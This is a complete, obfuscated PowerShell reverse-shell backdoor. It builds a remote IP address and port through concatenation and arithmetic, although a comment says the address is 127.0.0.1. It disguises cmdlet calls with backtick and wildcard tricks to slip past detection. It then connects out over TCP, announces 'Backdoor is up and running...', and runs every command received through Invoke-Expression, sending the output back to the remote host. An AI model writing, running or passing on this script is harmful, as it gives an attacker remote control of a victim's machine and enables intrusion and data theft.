# change the host address and/or port number as necessary
# obfuscated host address, same as $a = "127.0.0.1";
$a = "35" + "." + "176" + "." + "12" + "." + "203";
# obfuscated port number, same as $p = 9000;
$p = 1000 + 8000 + 0 + 100;
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
& (`G`C`M *e-Ho??);
$c = $null;
$t = $null;
$b = $null;
$w = $null;
$d = $null;
$r = $null;
try {
	$c = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
	$t = $c.GetStream();
	$b = & (`G`C`M *ew-O*) Byte[] (1000 + 12 + 12);
	$e = & (`G`C`M *ew-O*) Text.AsciiEncoding;
	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($t)');
	$w.AutoFlush = $true;
	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
	$by = 0;
	do {
		$w.Write("PS>");
		do {
			$by = $t.Read($b, 0, $b.Length);
			if ($by -gt 0) {
				$d = $d + $e.GetString($b, 0, $by);
			}
		} while ($t.DataAvailable);
		if ($d.Length -gt 0) {
			try {
				$r = & (`G`C`M *ke-E*) -Command $d 2>&1 | & (`G`C`M *ut-S?????);
			} catch {
				$r = $_.Exception;
			}
			$w.WriteLine($r);
			& (`G`C`M *r-Va*) -Name "d";
		}
	} while ($by -gt 0);
} catch {
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
} finally {
	if ($w -ne $null) {
		$w.Close();
		$w.Dispose();
	}
	if ($t -ne $null) {
		$t.Close();
		$t.Dispose();
	}
	if ($c -ne $null) {
		$c.Close();
		$c.Dispose();
	}
	if ($b -ne $null) {
		$b.Clear();
	}
	if ($d -ne $null) {
		& (`G`C`M *r-Va*) -Name "d";
	}
	if ($r -ne $null) {
		& (`G`C`M *r-Va*) -Name "r";
	}
}
